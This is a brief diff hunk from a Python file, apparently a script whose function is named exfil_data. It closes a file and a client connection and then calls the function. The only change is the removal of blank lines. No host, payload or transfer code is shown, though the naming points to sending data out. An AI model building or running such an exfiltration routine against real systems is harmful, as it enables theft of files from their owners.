@@ -20,10 +20,4 @@ def exfil_data():
     file.close()
     client.close()
 
-    
-
-
-
-
-
 exfil_data()
